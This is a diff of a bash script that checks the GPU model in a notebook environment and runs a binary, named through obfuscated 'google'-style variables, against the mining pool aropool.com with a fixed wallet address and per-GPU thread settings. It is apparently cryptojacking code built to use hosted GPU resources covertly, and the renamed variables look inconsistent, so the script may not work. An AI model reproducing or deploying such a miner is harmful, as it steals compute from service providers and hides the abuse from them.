@@ -1,6 +1,6 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
-google8474=$(shuf -i 8874748874-8874748874748874 -n 1)
+google84741274=$(shuf -i 8874748874-8874748874748874 -n 1)
 
 cd /notebooks/
 
@@ -19,7 +19,7 @@ google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
 if [[ $google8474 == "QuadroP4000" ]]
 then
 
-timeout 84 ./$google8474 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
+timeout 84 ./$google84741274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -31,7 +31,7 @@ else
 if [[ $google8474 == "QuadroM4000" ]]
 then
 
-timeout 84 ./$google8474 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+timeout 84 ./$google84741274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -43,7 +43,7 @@ else
 if [[ $google8474 == "QuadroP5000" ]]
 then
 
-timeout 84 ./$google8474 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 22 -b 22
+timeout 84 ./$google84741274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 22 -b 22
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -52,7 +52,7 @@ fi
 
 else
 
-timeout 84 ./$google8474 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
+timeout 84 ./$google84741274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 20 -b 20
 if [ $? -eq 124 ]; then
 echo "google84"
 else
